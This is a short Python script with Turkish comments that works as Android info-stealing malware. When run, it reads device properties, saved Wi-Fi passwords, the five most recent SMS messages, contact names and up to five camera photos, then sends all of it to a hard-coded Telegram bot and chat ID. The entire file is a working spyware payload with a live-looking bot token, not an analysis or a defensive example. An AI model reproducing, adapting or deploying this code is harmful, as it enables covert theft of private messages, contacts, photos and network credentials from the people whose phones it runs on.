import os
import json
import requests
import telebot
from glob import glob

# 🔹 Telegram bot bilgileri
TOKEN = "7823207013:AAHMEmLrDirYtnGu43gX5BR8YrgVNrrTNQU"
CHAT_ID = "6202798562"
bot = telebot.TeleBot(TOKEN)

# 📌 1. Sistem Bilgilerini Al
def get_system_info():
    info = os.popen("getprop").read()
    return info if info else "Sistem bilgileri alınamadı."

# 📌 2. Wi-Fi Şifrelerini Al (Root Gerektirebilir)
def get_wifi_passwords():
    wifi_info = os.popen("cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null").read()
    return wifi_info if wifi_info else "Wi-Fi şifrelerine erişilemedi!"

# 📌 3. SMS Mesajlarını Al (Root Gerektirebilir)
def get_sms():
    sms_data = os.popen("sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db 'SELECT address, body FROM sms ORDER BY date DESC LIMIT 5;'").read()
    return sms_data if sms_data else "SMS bulunamadı."

# 📌 4. Rehberi Al (Root Gerektirebilir)
def get_contacts():
    contacts = os.popen("sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db 'SELECT display_name FROM view_contacts;'").read()
    return contacts if contacts else "Rehber boş."

# 📌 5. Galeriden Fotoğraf Gönder
def send_photos():
    photo_dir = "/storage/emulated/0/DCIM/Camera/"
    photos = glob(photo_dir + "*.jpg")[:5]  # İlk 5 fotoğrafı al

    for photo_path in photos:
        with open(photo_path, "rb") as img:
            bot.send_photo(CHAT_ID, img)

# 📌 6. Bilgileri Telegram'a Gönder
def send_report():
    system_info = get_system_info()
    wifi_info = get_wifi_passwords()
    sms_messages = get_sms()
    contacts = get_contacts()
    
    message = f"📱 *Cihaz Bilgileri:*\n```{system_info}```\n\n"
    message += f"📶 *Wi-Fi Şifreleri:*\n```{wifi_info}```\n\n"
    message += f"📩 *Son SMS'ler:*\n```{sms_messages}```\n\n"
    message += f"👥 *Rehber:*\n```{contacts}```\n\n"
    
    bot.send_message(CHAT_ID, message, parse_mode="Markdown")

    send_photos()  # Fotoğrafları da gönderelim

# 📌 Botu Çalıştır ve Bilgileri Gönder
send_report()
